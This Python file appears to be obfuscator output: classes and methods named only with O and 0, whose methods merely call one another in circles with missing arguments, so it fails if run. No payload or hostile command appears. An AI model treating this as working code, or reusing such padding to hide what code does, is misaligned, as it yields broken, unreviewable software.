class O0OO0OOO000OO00OO :
    def __init__ (OO0O000OO0OOOOO0O ):
        OO0O000OO0OOOOO0O .__OO000OO0OO0OO0OOO ()
        OO0O000OO0OOOOO0O .__OOOOOOO0O00O0OO00 ()
        OO0O000OO0OOOOO0O .__OO0OO0O0OO0OO000O ()
        OO0O000OO0OOOOO0O .__OOO00OO0OO0OO0OO0 ()
        OO0O000OO0OOOOO0O .__O0000OOOOO0O0OOOO ()
        OO0O000OO0OOOOO0O .__O0O00O00000O0OO0O ()
        OO0O000OO0OOOOO0O .__O0O0O00O0O0O00000 ()
        OO0O000OO0OOOOO0O .__O000000OOOO000O00 ()
        OO0O000OO0OOOOO0O .__O0OOO0OO00OO00O0O ()
        OO0O000OO0OOOOO0O .__OO00OOO00O0OOO0O0 ()
        OO0O000OO0OOOOO0O .__OO00OOOOO00O0OOO0 ()
        OO0O000OO0OOOOO0O .__O0O0OO0O00O0O0OOO ()
        OO0O000OO0OOOOO0O .__OO0OOOOO0OOO0OOO0 ()
    def __OO000OO0OO0OO0OOO (O0O00000O00O0OOO0 ,OOO00OO0000O000OO ):
        return O0O00000O00O0OOO0 .__O0000OOOOO0O0OOOO ()
    def __OOOOOOO0O00O0OO00 (O0O0000O0OO0OOOO0 ,OOO000000OO000OO0 ,OO000000OO00OOOO0 ,O0000O00O0OO000O0 ,OOOOO0OO000OO0000 ,OOOO00O000O0O00OO ,O0OO0O0OO00OO0000 ,O0O0O0OOOOOOOO000 ):
        return O0O0000O0OO0OOOO0 .__O0O0O00O0O0O00000 ()
    def __OO0OO0O0OO0OO000O (OOOO0O0OO00O0OO0O ,OO0O0O0OOO0OOOOO0 ,O00O000000000O0O0 ):
        return OOOO0O0OO00O0OO0O .__O0O00O00000O0OO0O ()
    def __OOO00OO0OO0OO0OO0 (OO00O000OO000OO00 ,O000O00OOOO000OOO ,OO0OOO0OOOOOOOO0O ,O000O0O00OOOOOO0O ,OOOOO00000OOOO000 ,O0OOOO0OOO00000OO ,O00OO000O0000O0OO ,O00O0000O0O0OOO0O ):
        return OO00O000OO000OO00 .__OO0OOOOO0OOO0OOO0 ()
    def __O0000OOOOO0O0OOOO (O0000O000O0O00OOO ,O00OOO0O0O0O000O0 ,OO00OOOOOO00O000O ,O000OO0OOOO00OOO0 ,OOOO0O0OO0O00O000 ,OO00O0O0O0O00O0O0 ,OO0OO00OO0OOO0O00 ):
        return O0000O000O0O00OOO .__O0OOO0OO00OO00O0O ()
    def __O0O00O00000O0OO0O (O000OO00O0OO0O0OO ,O0O0O0O000O0OO000 ,O0000OO0OOOO0O00O ,OO0O0O000OO00O0O0 ):
        return O000OO00O0OO0O0OO .__O0O00O00000O0OO0O ()
    def __O0O0O00O0O0O00000 (O000OO00OO0O0OO00 ,O0OOOOO00O0OOO000 ,O00O0OOOOO0000O0O ,OOOO0O0OO0O0OOOOO ):
        return O000OO00OO0O0OO00 .__O0O0OO0O00O0O0OOO ()
    def __O000000OOOO000O00 (O00O0OOO0OOOO0O00 ,O000O0O000O00O000 ,O00OOOO0OO0OO000O ,OOOOOO000OOO0OOO0 ,OOOOO0O0O0O0O0OOO ):
        return O00O0OOO0OOOO0O00 .__O0O00O00000O0OO0O ()
    def __O0OOO0OO00OO00O0O (O00O0O0OOO0OO0000 ,O0OO0O0O0OO0OOO00 ,OO0OO000OOO00O00O ,O0OO0OOOO00OO0O0O ,OO0O00O0OOO000OO0 ,OOOOO00OO0O0O0O0O ):
        return O00O0O0OOO0OO0000 .__O000000OOOO000O00 ()
    def __OO00OOO00O0OOO0O0 (O000OOOO0OOOO00OO ,OO0OO0O0OO000O0O0 ,OO0O0OOO0O0OO00OO ,OOO000OO0O0OO0OO0 ):
        return O000OOOO0OOOO00OO .__OO00OOO00O0OOO0O0 ()
    def __OO00OOOOO00O0OOO0 (O000OOOO0OO0OOOO0 ,O000O0O00OO00OOO0 ,OO0OOOO0OOOO0O00O ,O0O00OOO0O000O000 ,O0OOOO00O0OOOO00O ,O000OOO0OOO00000O ,O000O00OOOO0O0OO0 ):
        return O000OOOO0OO0OOOO0 .__OO00OOO00O0OOO0O0 ()
    def __O0O0OO0O00O0O0OOO (O0OO000O0OO000O00 ,OOOO0OO0000OOOOOO ,OO000OO0000O00000 ,O000O0OO0OO00000O ,O000O0OO0OOOO0OO0 ,OO0OO00OOOOOOO0O0 ,O0O0OO0OO0OO0OO00 ,OOO00OOOO00O000OO ):
        return O0OO000O0OO000O00 .__OO0OO0O0OO0OO000O ()
    def __OO0OOOOO0OOO0OOO0 (O00O0O0O00OO0O00O ,O0O0O00O0O00OO000 ):
        return O00O0O0O00OO0O00O .__OO00OOOOO00O0OOO0 ()
class O0O0O000OO0O0OOOO :
    def __init__ (O00O00O000O0000OO ):
        O00O00O000O0000OO .__OOO000O0OOO0OOOO0 ()
        O00O00O000O0000OO .__OO000O00O0O0OOOOO ()
        O00O00O000O0000OO .__O0OOOOOO00OO0O00O ()
        O00O00O000O0000OO .__OO00O00000O0O000O ()
        O00O00O000O0000OO .__O00000O00OO0O0OO0 ()
        O00O00O000O0000OO .__OO00OO0OO0OOOO00O ()
        O00O00O000O0000OO .__OOO0OOO0OO00OO00O ()
        O00O00O000O0000OO .__OOO0O000O0000OO00 ()
    def __OOO000O0OOO0OOOO0 (OO0OO0O000OO0O00O ,OO00OO0000O0OO000 ,O0OO0OOOO0000O00O ):
        return OO0OO0O000OO0O00O .__OO00OO0OO0OOOO00O ()
    def __OO000O00O0O0OOOOO (O00OOO0OO0OOOO0O0 ,O0O00O000000OOO00 ,OOO000O00O0O0OOO0 ,OOO0OOO0OO000O0O0 ,OO0O000OOO00O0O0O ,OO0OOOO00OO0OOOO0 ,O0OO0OOO0O00OOOO0 ):
        return O00OOO0OO0OOOO0O0 .__O0OOOOOO00OO0O00O ()
    def __O0OOOOOO00OO0O00O (OOO00OO0OOOOO00OO ,OO0OOOOO000OOOO0O ,OO0000OO000O0OOO0 ,O000OOO000O00O0OO ):
        return OOO00OO0OOOOO00OO .__OO00OO0OO0OOOO00O ()
    def __OO00O00000O0O000O (O000000OOOO000OOO ,OOO0OOO00OO00OO0O ,OO00000OO00000O0O ,OOOOO0OOO00O0O0OO ,OO0O0OO00O00OO000 ):
        return O000000OOOO000OOO .__OOO0OOO0OO00OO00O ()
    def __O00000O00OO0O0OO0 (OO000000O00OO00OO ,O0O000000O0OOO0OO ,O0OOO00OOO000OOOO ,OOOO0O0OO00OOO00O ,OO0O000OO000000O0 ,OOO00O0O0O0OOOOOO ,OO0OOO00O0O0OO00O ):
        return OO000000O00OO00OO .__OOO000O0OOO0OOOO0 ()
    def __OO00OO0OO0OOOO00O (OO0OO00OOO0000O00 ,O0000O0OO00OOO00O ,OOOOO0O0OO0O0000O ,OO0O0OOO0O000OO0O ,OOO000OOO0OOO00O0 ,OO0O0O0OO00OOO000 ,OO0OO000OOOO00000 ,O000O0O0000O0O00O ):
        return OO0OO00OOO0000O00 .__OO000O00O0O0OOOOO ()
    def __OOO0OOO0OO00OO00O (OO000O0OOO00OOOO0 ,OO0OOO0O000O0000O ,O00OOOOO0O000OO0O ,OO0000O0OOOO00000 ,O0OO000O00O000OO0 ):
        return OO000O0OOO00OOOO0 .__OO000O00O0O0OOOOO ()
    def __OOO0O000O0000OO00 (O0O00OOOOO00O0OO0 ,OOO00O0O0O00O00O0 ,O00OOOO00O000O0OO ,OO000O0OO000OOO00 ,OO000O00O0O0O000O ,OO0OOO000OOO000OO ,OOOOO00OO00OOOO00 ,OO0O0O000OOOO000O ):
        return O0O00OOOOO00O0OO0 .__OOO000O0OOO0OOOO0 ()
class OO0OO0O0O0O00O00O :
    def __init__ (OO0OOO0000OOO0OOO ):
        OO0OOO0000OOO0OOO .__OOOO0OOO0O00O0000 ()
        OO0OOO0000OOO0OOO .__O0OO0O000O000O000 ()
        OO0OOO0000OOO0OOO .__O00OO0OOO0OO0OOO0 ()
        OO0OOO0000OOO0OOO .__OOO0OOOOOO0OO0O00 ()
        OO0OOO0000OOO0OOO .__O00OO0OOOOOOO0OOO ()
        OO0OOO0000OOO0OOO .__O0O000OOO00OO0000 ()
        OO0OOO0000OOO0OOO .__OO000OOOO00000OO0 ()
        OO0OOO0000OOO0OOO .__OOOOO0OO0OOOOO0OO ()
        OO0OOO0000OOO0OOO .__O0O0O00O0O0OO0O0O ()
        OO0OOO0000OOO0OOO .__OO000O0O0OOOOOO00 ()
        OO0OOO0000OOO0OOO .__O0O0OOO00OO0O0O0O ()
        OO0OOO0000OOO0OOO .__OOO000000OO0O0OOO ()
        OO0OOO0000OOO0OOO .__O0O0OO00OO0000OOO ()
        OO0OOO0000OOO0OOO .__OOO0O000000OOOOOO ()
    def __OOOO0OOO0O00O0000 (O00000000OO0OOO0O ,OOOO0O0O00OOOO0OO ,OO00OO0O00OOOO0OO ,OO0OO0O0O0O0OOO00 ,O0O0OO00000000000 ):
        return O00000000OO0OOO0O .__O00OO0OOOOOOO0OOO ()
    def __O0OO0O000O000O000 (OOO0O0O0OOO00O000 ,O00O0000OO0O000O0 ,OO00OOOO0O0O0O0OO ):
        return OOO0O0O0OOO00O000 .__OOO000000OO0O0OOO ()
    def __O00OO0OOO0OO0OOO0 (O0OO0O0O0O0OOO000 ,OO00OO0O0OOO00000 ):
        return O0OO0O0O0O0OOO000 .__OOO000000OO0O0OOO ()
    def __OOO0OOOOOO0OO0O00 (OO0OOOO0OOOO0O0O0 ,OOOO000OOOO0000OO ,OO0000000OO000000 ,OOOOO0OO00O0O0OOO ,O00OO0OO000OOO00O ,OOO0O00O0O000OOO0 ,O0OOOOO0O0O0O00OO ):
        return OO0OOOO0OOOO0O0O0 .__O0O0OO00OO0000OOO ()
    def __O00OO0OOOOOOO0OOO (OO00O0O0O00O0OO0O ,O0OOOOO00000O0O0O ,O0O0000OOO00000O0 ):
        return OO00O0O0O00O0OO0O .__O0O000OOO00OO0000 ()
    def __O0O000OOO00OO0000 (OO0OO0OOO0O0OOO0O ,OO000000OOO00OOO0 ,OO00O000OOOOOOO0O ,O0OOOOOOO00OOO000 ,OO00O0OO0O0OO00OO ,OO0000OO0O0O000O0 ,O00OO0O0OOOO0O000 ):
        return OO0OO0OOO0O0OOO0O .__OO000OOOO00000OO0 ()
    def __OO000OOOO00000OO0 (O0OO0OOO0O0000O00 ,O0OOO00OOOO00O0O0 ):
        return O0OO0OOO0O0000O00 .__OOO000000OO0O0OOO ()
    def __OOOOO0OO0OOOOO0OO (OO0000OO0OO000O00 ,OO0000O00000000OO ,O00O00O0O0O00OOO0 ,OOO0000O0000O0OOO ,OOOOOO000OOO0O00O ,OOO0OOO0OOO0OO0O0 ):
        return OO0000OO0OO000O00 .__O0O0O00O0O0OO0O0O ()
    def __O0O0O00O0O0OO0O0O (OO00O0O0000O000OO ,O0O00O0OO0O00OOO0 ,OOOOOOO0000O0OO00 ,O0000OOO0O0000O0O ,O0OO00OO0O00O00O0 ,OO000000OO0O0OOO0 ):
        return OO00O0O0000O000OO .__OOO0O000000OOOOOO ()
    def __OO000O0O0OOOOOO00 (O00000000O0O00OO0 ,O0OOO00OO00OO000O ,OO0O00OO0OOOOO0OO ,O0OOOO0OOOO000000 ,O0OO00OOOO0O00000 ,O0O000O00OO0000OO ):
        return O00000000O0O00OO0 .__O0O0OO00OO0000OOO ()
    def __O0O0OOO00OO0O0O0O (O00O000O0OO0OO0O0 ,O000OO0O000O0O0OO ,OOO00OOO0O0OOO00O ,OO000OOO00O0OOO00 ):
        return O00O000O0OO0OO0O0 .__OOO0OOOOOO0OO0O00 ()
    def __OOO000000OO0O0OOO (O00OOOOOOO0O0OO00 ,O0O0O0OOOO0O0OOO0 ,O000OOOOOO0OOO0O0 ,OO0OOOOO000O000O0 ,O00OO0O0OO0000000 ,OOOOO00O0O0OOO0O0 ,O0O0000000O0OO0OO ):
        return O00OOOOOOO0O0OO00 .__OOO000000OO0O0OOO ()
    def __O0O0OO00OO0000OOO (OOOOOOO00OOOOOO0O ,OO0O0OO00O00O0OOO ,O00O0O000O00OO000 ,O0O0O0O000OO0O0OO ,O000O0O00OOO0OO0O ,OOO0O000O00OO0OO0 ,OO0OO0O0OOO0OOO0O ,O0OO0O00OOO0000OO ):
        return OOOOOOO00OOOOOO0O .__OOOOO0OO0OOOOO0OO ()
    def __OOO0O000000OOOOOO (OOOOO0O0OO0OO0O0O ,OO0OOOO0OO0OO0OO0 ,OO000O0OO00OO0OO0 ,O0O0O0000OOOO00OO ,OOO0O0OO00O0OO00O ):
        return OOOOO0O0OO0OO0O0O .__O0O0OO00OO0000OOO ()
class OOO0O00OO00000OO0 :
    def __init__ (O0O0O000000O0OOO0 ):
        O0O0O000000O0OOO0 .__OOOOO00O00OOOO000 ()
        O0O0O000000O0OOO0 .__O0O00O00OOOOO0O00 ()
        O0O0O000000O0OOO0 .__O0O00O0OO0O00O0OO ()
        O0O0O000000O0OOO0 .__O0O0O0OO00OOOO00O ()
        O0O0O000000O0OOO0 .__O00OO00O000OO0O0O ()
        O0O0O000000O0OOO0 .__O000O00000OO0OO0O ()
        O0O0O000000O0OOO0 .__OOO0O0O0000OOOOO0 ()
    def __OOOOO00O00OOOO000 (O0OO0000OOOOOOO0O ,O000O00O000OOO00O ,OOOOO00O00O0OOOOO ,OO0OO0O00000O0OO0 ,O0O00OOO00O0000OO ):
        return O0OO0000OOOOOOO0O .__O00OO00O000OO0O0O ()
    def __O0O00O00OOOOO0O00 (O0O0O0000O00O0000 ,O00O000O0OOO0O0OO ,OOOO00OO00OOO0O0O ,O00000O0O000O00OO ):
        return O0O0O0000O00O0000 .__O000O00000OO0OO0O ()
    def __O0O00O0OO0O00O0OO (O0OOOO0O0OO00O0O0 ,O00O0O0000O0O0000 ,O000OOOOOOOO0OOO0 ,OOOOOO00O00000O0O ):
        return O0OOOO0O0OO00O0O0 .__O0O00O00OOOOO0O00 ()
    def __O0O0O0OO00OOOO00O (O0000O00O0OOO0OOO ,OO000OO000OOO0OOO ,O0OOO0O0OO0OOO0O0 ):
        return O0000O00O0OOO0OOO .__O0O00O0OO0O00O0OO ()
    def __O00OO00O000OO0O0O (OO0OO000O0O00OOO0 ,O0OOOOOOOOO000O00 ):
        return OO0OO000O0O00OOO0 .__O0O00O00OOOOO0O00 ()
    def __O000O00000OO0OO0O (O0OOO0OO0OO0O000O ,OO0OOO00O000000O0 ,O0OOO000OO000OO0O ,O0OOO00OO00OO0O00 ,OOOOO000O0OOO0OOO ,O0O0000O00OOOOOOO ,O0OOOO0O0O000OO00 ,OO0O0O0O0000O0O00 ):
        return O0OOO0OO0OO0O000O .__OOO0O0O0000OOOOO0 ()
    def __OOO0O0O0000OOOOO0 (O000OOO0OOOOOO0O0 ,OOOO000O000O0000O ,O00OO0OOO000OO00O ,O000OOO00OO0000O0 ,OOOOOOO00O000OO0O ,O0O0O0O0O0OOOO0O0 ,OO0OOOOO000OO0O0O ):
        return O000OOO0OOOOOO0O0 .__OOO0O0O0000OOOOO0 ()
class O0O0OOOOOOO00O0OO :
    def __init__ (OO00O0000OO0OOOOO ):
        OO00O0000OO0OOOOO .__OO0OOOO00O0OOO00O ()
        OO00O0000OO0OOOOO .__OO0O0OO000O000OO0 ()
        OO00O0000OO0OOOOO .__O0O00OO0O000OOO00 ()
        OO00O0000OO0OOOOO .__OO0O0000000OOOO0O ()
        OO00O0000OO0OOOOO .__O0O000OO0OOOO00O0 ()
        OO00O0000OO0OOOOO .__OO0O00OO0O0O0O000 ()
        OO00O0000OO0OOOOO .__O000OO0OO00OOOO0O ()
        OO00O0000OO0OOOOO .__OO0OOOO0OOO0000OO ()
        OO00O0000OO0OOOOO .__OO00OOOO00O0O0O0O ()
    def __OO0OOOO00O0OOO00O (OOO0OO000O0O0OO00 ,O00O00O0OOO0OOOOO ,OOO00OO0O000O0O0O ,OO0000000OOO00O00 ,O0O0OOO00O0O000O0 ,O0O00O00O0O0OO000 ,OOOOO0O0O00OOOOO0 ):
        return OOO0OO000O0O0OO00 .__OO0O0000000OOOO0O ()
    def __OO0O0OO000O000OO0 (O00OOO00O0O0O0OO0 ,O0OOO000O0OO0000O ):
        return O00OOO00O0O0O0OO0 .__OO0O0OO000O000OO0 ()
    def __O0O00OO0O000OOO00 (O0O00O0O00O000OOO ,O0OO000O0O00OOO00 ):
        return O0O00O0O00O000OOO .__OO0O0OO000O000OO0 ()
    def __OO0O0000000OOOO0O (OO0O000OO0O0000O0 ,O0000OOOO000O0OOO ,O0OO000O0OO0O00O0 ,OO00O0OO000OOO0OO ,O0O00OOOOO0O0000O ):
        return OO0O000OO0O0000O0 .__OO0O0OO000O000OO0 ()
    def __O0O000OO0OOOO00O0 (OOO0OOOOOO0OOOOO0 ,OO0OOO0O0O0OO0OO0 ,OO0OO0OO000O0O0O0 ):
        return OOO0OOOOOO0OOOOO0 .__OO0OOOO00O0OOO00O ()
    def __OO0O00OO0O0O0O000 (OO0O0O0OOO000O000 ,OOO00OO0OOO00OOOO ,OO0OO000OO000OO0O ):
        return OO0O0O0OOO000O000 .__OO0OOOO00O0OOO00O ()
    def __O000OO0OO00OOOO0O (O0OO000O000O0O0O0 ,O0000O00OO0OOO0O0 ,OO0OOOO0OOO00O0OO ,O00OOO00O0O0OO0O0 ,OOOOOOOOOO00O0OOO ):
        return O0OO000O000O0O0O0 .__O0O000OO0OOOO00O0 ()
    def __OO0OOOO0OOO0000OO (OO00O0O0OOOOO0OO0 ,O0O000OO0000OO0O0 ,O0O0000OOOO000O0O ,O000O000OOO0O0O0O ):
        return OO00O0O0OOOOO0OO0 .__OO00OOOO00O0O0O0O ()
    def __OO00OOOO00O0O0O0O (OO000O0O00OO0OO00 ,O0O00OOOOOO0OO00O ):
        return OO000O0O00OO0OO00 .__OO00OOOO00O0O0O0O ()
class OOO0OO0O000O0OO00 :
    def __init__ (OOOO00O0OO0O0OOOO ):
        OOOO00O0OO0O0OOOO .__O00O0OOO00OO0OOOO ()
        OOOO00O0OO0O0OOOO .__O00O0O0OO000O0O00 ()
        OOOO00O0OO0O0OOOO .__O0O00OOO0O0000000 ()
        OOOO00O0OO0O0OOOO .__O0000OOOOOO000OO0 ()
        OOOO00O0OO0O0OOOO .__O0O0O000OOO0O0OO0 ()
        OOOO00O0OO0O0OOOO .__O0000O00OO00OOO0O ()
        OOOO00O0OO0O0OOOO .__O00O0OO0O000O0OO0 ()
        OOOO00O0OO0O0OOOO .__OOO0O00OOOOOO0OOO ()
        OOOO00O0OO0O0OOOO .__O000O0O0OO0O00OO0 ()
    def __O00O0OOO00OO0OOOO (OO000OOOO0OOO0O00 ,O000OOOO000OOOO0O ,O00OO0000O0O0000O ,OO0OOOO00OO0OO00O ,O0O0O0OOOOO00O0OO ):
        return OO000OOOO0OOO0O00 .__O00O0OO0O000O0OO0 ()
    def __O00O0O0OO000O0O00 (O00000O0OO0OOOO0O ,OOO0OO0O0O0O0O000 ,OO000O0O0O0OO0O0O ):
        return O00000O0OO0OOOO0O .__O0O0O000OOO0O0OO0 ()
    def __O0O00OOO0O0000000 (O000000O0O0OOOOO0 ,O00O0OO0O000OOO00 ,O0OOOOOOO0O000000 ,OOOO00000O0O0000O ,O0OOOOOO0O000000O ,OO000OO0OO000O0OO ,O00OOO0O00OOO00O0 ,OOO000O0O000OO0OO ):
        return O000000O0O0OOOOO0 .__OOO0O00OOOOOO0OOO ()
    def __O0000OOOOOO000OO0 (O0O0O00O0O000OOOO ,OO000O0OO0000OO00 ,OO00OOOO0000OOOOO ,O0O00000OO0OO000O ,OO0O0OOOOOO00O0O0 ):
        return O0O0O00O0O000OOOO .__O0O00OOO0O0000000 ()
    def __O0O0O000OOO0O0OO0 (O0OO0O00000O0OO00 ,OOOO0OO000000O0O0 ,O00OO00O0OO00OO0O ,OOOOOO00O0O0OOOO0 ,OOO0OOO0OOOOO0OOO ,O00OOOO000O0O0OOO ):
        return O0OO0O00000O0OO00 .__O0O0O000OOO0O0OO0 ()
    def __O0000O00OO00OOO0O (O0OO0O0OO0O00OOOO ,O0OOOO0OO0OOOO0OO ,OO0O0OO0OO0O00OOO ,O000O0OOOOOOOOOOO ,OO0OOO0OO0OOOO0O0 ,OO00O0OOO000OO000 ,OO000OOOOO0000O0O ,OO00O000O0OOOO0O0 ):
        return O0OO0O0OO0O00OOOO .__O0O00OOO0O0000000 ()
    def __O00O0OO0O000O0OO0 (OOOO0O0O0OOO0000O ,OOOOO000O0000O0OO ):
        return OOOO0O0O0OOO0000O .__O0O0O000OOO0O0OO0 ()
    def __OOO0O00OOOOOO0OOO (O0000O0O0O00O0000 ,OO0O0000O00O00O00 ,O000O00000OO00O0O ,O0000OO0O0O000000 ,O0000O000OOO000O0 ):
        return O0000O0O0O00O0000 .__O000O0O0OO0O00OO0 ()
    def __O000O0O0OO0O00OO0 (O0OOO00O00OO00000 ,OOO000OO00O0O0O00 ,O0OO0OOOOOO000000 ,OOO0O00O0OOO0OOO0 ):
        return O0OOO00O00OO00000 .__O0000O00OO00OOO0O ()
class OO0O00O0000O0O0OO :
    def __init__ (OO0O00OOOO0O0OO00 ):
        OO0O00OOOO0O0OO00 .__OOO0OOO0O0OOO000O ()
        OO0O00OOOO0O0OO00 .__OO0OO0O000OOO00O0 ()
        OO0O00OOOO0O0OO00 .__OO000O0OO0OOO00OO ()
        OO0O00OOOO0O0OO00 .__O00OO0000O000OOO0 ()
        OO0O00OOOO0O0OO00 .__OO000OO0OOOO0000O ()
    def __OOO0OOO0O0OOO000O (O0OOOO00O0OOOO0OO ,OO00OOOOOO0000O00 ,O00OOOOOOOO0OOO00 ,OO00O00OOOO0OOO00 ,OOOO00000OOOOOO0O ,OOO0OO0OO0000OOO0 ,OOOOO0O0O00O00O0O ):
        return O0OOOO00O0OOOO0OO .__OOO0OOO0O0OOO000O ()
    def __OO0OO0O000OOO00O0 (OOO000O00OO00O0O0 ,O0OO0O00OO00O0OO0 ,O0000OO0000OO00O0 ,O0O00O0O00OOOOO0O ,OOO00O0O000O000OO ,O0OOO000OOO0O00O0 ):
        return OOO000O00OO00O0O0 .__OOO0OOO0O0OOO000O ()
    def __OO000O0OO0OOO00OO (OO0000OO0O0O0O00O ,OO0O000O0O0O000O0 ):
        return OO0000OO0O0O0O00O .__OO000OO0OOOO0000O ()
    def __O00OO0000O000OOO0 (OOO000OO000O00OO0 ,O0OOOO0O00O0OOOO0 ,OOOOOO00OOO00000O ,OOOOOOOOO00O00OO0 ):
        return OOO000OO000O00OO0 .__OO000OO0OOOO0000O ()
    def __OO000OO0OOOO0000O (O000O00O0O0000O0O ,O000OOO0OOOO00O0O ,O000OOOO000OOOOOO ,OO00O000O0O00000O ,O0000O0OOOOOOOO00 ,OO0OOO0O0OO000O00 ,O000O000O0OOO00OO ):
        return O000O00O0O0000O0O .__OO000OO0OOOO0000O ()
class OO00O0O0OOO0O0000 :
    def __init__ (O000OO0O0O0O00O00 ):
        O000OO0O0O0O00O00 .__OO000O0O000OOO000 ()
        O000OO0O0O0O00O00 .__OO0O0000O0O000O00 ()
        O000OO0O0O0O00O00 .__O0O000OO0O0O0OO0O ()
        O000OO0O0O0O00O00 .__O00OO00000OOOOOO0 ()
        O000OO0O0O0O00O00 .__OOO0O00OOOO00OO00 ()
        O000OO0O0O0O00O00 .__O0O0OO00O0O0OOO0O ()
        O000OO0O0O0O00O00 .__OO00000O0O00O0OO0 ()
        O000OO0O0O0O00O00 .__O0OOO0O00O00OOOO0 ()
        O000OO0O0O0O00O00 .__OO0000O0O0O00OO0O ()
        O000OO0O0O0O00O00 .__OO0O00000OOOO0OO0 ()
        O000OO0O0O0O00O00 .__OOO000O0OOO00OOO0 ()
        O000OO0O0O0O00O00 .__OOOO0OO0OOOO00OO0 ()
        O000OO0O0O0O00O00 .__O0000OOOOOO0O0O00 ()
    def __OO000O0O000OOO000 (O00OOOOO00OOOO00O ,O000OOOO0OOO0O0OO ):
        return O00OOOOO00OOOO00O .__O0O000OO0O0O0OO0O ()
    def __OO0O0000O0O000O00 (O000OO0000O00O0O0 ,OOO00OOO0000OO0O0 ,O00O0OO0OOO0O0000 ,OO0O00000O000O000 ,OO0000OOO0OO0O000 ,OO0OO0OOOOO00O00O ,O0OOO0O0OO000OO00 ):
        return O000OO0000O00O0O0 .__OO000O0O000OOO000 ()
    def __O0O000OO0O0O0OO0O (OOO00000OOOO0O00O ,OO00O000O0OO000O0 ,O000000000OOO0000 ):
        return OOO00000OOOO0O00O .__O0000OOOOOO0O0O00 ()
    def __O00OO00000OOOOOO0 (O00OOO0O0OOO0O00O ,O0O00OO0OO00000OO ):
        return O00OOO0O0OOO0O00O .__O0000OOOOOO0O0O00 ()
    def __OOO0O00OOOO00OO00 (OO000O0O00O0O0OOO ,O0O00O0OOO000OO0O ,OOO00OOOOOO00OOO0 ,OO0OO000OO00OO0OO ,OO00OO00OOO0O00O0 ,OO0OOO00OO0O0OOO0 ):
        return OO000O0O00O0O0OOO .__OO0O00000OOOO0OO0 ()
    def __O0O0OO00O0O0OOO0O (O0O0000OOOO0000OO ,O0O0000O0OOOOOOOO ,O00O000O000000OO0 ,O0O00O0OOOO00OOOO ,O0OOO0O00O0O00O0O ,OO0O0OOO0OOOO000O ,OOOO0O0O00OO00OO0 ,OOOO00OO0OOO000OO ):
        return O0O0000OOOO0000OO .__O00OO00000OOOOOO0 ()
    def __OO00000O0O00O0OO0 (O0O0O0O00O0OOO0OO ,OOO0OO000000O0000 ,O0OO0O00O00OOOO00 ,O000O0000OO00000O ,O000OO0OO00O0OO0O ,O0O0O0OO00000OO00 ):
        return O0O0O0O00O0OOO0OO .__O0OOO0O00O00OOOO0 ()
    def __O0OOO0O00O00OOOO0 (OOOOO00O0O00OOOO0 ,O00OOOOO0O0OO0O0O ):
        return OOOOO00O0O00OOOO0 .__OOOO0OO0OOOO00OO0 ()
    def __OO0000O0O0O00OO0O (OOO00OOOO0O0O0OO0 ,OO0000000O0OOO000 ):
        return OOO00OOOO0O0O0OO0 .__OO0O0000O0O000O00 ()
    def __OO0O00000OOOO0OO0 (OOOO00O00O0O000O0 ,OO0OO0O0O00O00O00 ,O0OOO0O0OOOO0O00O ,O00OO00OOO0OO0OO0 ,OOO0000O0OO0OO000 ):
        return OOOO00O00O0O000O0 .__O0O000OO0O0O0OO0O ()
    def __OOO000O0OOO00OOO0 (OOO00O00O00OO0O0O ,OOOOO0O00OOOO0O00 ,O00000OO0O00OO000 ,OO00O0OO00O0O0000 ,OO0O0O00OOO0O0000 ):
        return OOO00O00O00OO0O0O .__O0O000OO0O0O0OO0O ()
    def __OOOO0OO0OOOO00OO0 (OOO0O0O00O00000OO ,OOOO0O00OO00O0OOO ,OO0000OO00OOOO0O0 ,O000OOOOO0OOO00OO ,O0OOOO00O0O0OO00O ):
        return OOO0O0O00O00000OO .__OO000O0O000OOO000 ()
    def __O0000OOOOOO0O0O00 (OO00O00O0OOO000O0 ,O00O00OO00000O00O ,O00O0O0OO0O00O0OO ,O00O00000O000OO0O ):
        return OO00O00O0OOO000O0 .__OO0000O0O0O00OO0O ()
class O0O0OO00OO0OO0OOO :
    def __init__ (O0O00O000OO0OOOOO ):
        O0O00O000OO0OOOOO .__OO0O0O00OOOOOO000 ()
        O0O00O000OO0OOOOO .__OO00OOOOO00OOO00O ()
        O0O00O000OO0OOOOO .__OOOOO0O0O00OO000O ()
        O0O00O000OO0OOOOO .__O0000000O00O00OO0 ()
        O0O00O000OO0OOOOO .__O00000OO00O0O0OO0 ()
        O0O00O000OO0OOOOO .__O00OOO0O0OOO00000 ()
        O0O00O000OO0OOOOO .__O00000OOO0O0000O0 ()
        O0O00O000OO0OOOOO .__O00O000OOOOO0OOO0 ()
        O0O00O000OO0OOOOO .__OOOO0OO00000O00OO ()
        O0O00O000OO0OOOOO .__O0OO0O00O0O0O0OO0 ()
        O0O00O000OO0OOOOO .__O00O0OO00OOO000OO ()
    def __OO0O0O00OOOOOO000 (OO0OOO00O0OO0O000 ,O00O0O00000OO0OO0 ,OO0000OO0O0OO000O ,O000O000000000OO0 ,O0O0O00O00O00OOO0 ,OOOOO0O0OO0000OO0 ,OO0O0000000OO0OOO ,OO00000O000O0OO00 ):
        return OO0OOO00O0OO0O000 .__O00000OOO0O0000O0 ()
    def __OO00OOOOO00OOO00O (O0OOOO00OO00OO000 ,OO0O0OOOOOOO00OOO ,OOOOOOOOO00000OOO ,O0O0OOOO0OOO0OO00 ,OOO0OO0OOOOO00OOO ):
        return O0OOOO00OO00OO000 .__O00O000OOOOO0OOO0 ()
    def __OOOOO0O0O00OO000O (OOO0O000OOO0OO000 ,OOOOO0OOOOOOOOO00 ,OO0O0O000O00OOOOO ,O000O00O00O0000O0 ,O00O0000OOOOO00O0 ,OO0O0O0000OOO0000 ,O000000000O0000O0 ):
        return OOO0O000OOO0OO000 .__O00OOO0O0OOO00000 ()
    def __O0000000O00O00OO0 (O000OOOO00OOOOOO0 ,OOOOO0OO0OOO0O0OO ,OO000OOOO000O0000 ):
        return O000OOOO00OOOOOO0 .__O00O0OO00OOO000OO ()
    def __O00000OO00O0O0OO0 (OOO0O0O0O0O0OOOO0 ,OOO0O000OO0OOO0OO ):
        return OOO0O0O0O0O0OOOO0 .__O00000OO00O0O0OO0 ()
    def __O00OOO0O0OOO00000 (O0O0OOOO0OOO0000O ,OOO000O00OO0O00OO ,OO0O0OO00O0O00O0O ,OOO0OOOO00O0O00OO ,OO0OOO0OO0O0O00O0 ,OO0OOOOOOOO0000OO ,O0OO00OO0OOO0O0O0 ):
        return O0O0OOOO0OOO0000O .__O00000OOO0O0000O0 ()
    def __O00000OOO0O0000O0 (O00O0O0O00O00O000 ,O00O0O0O0OO0O0OOO ):
        return O00O0O0O00O00O000 .__O00000OOO0O0000O0 ()
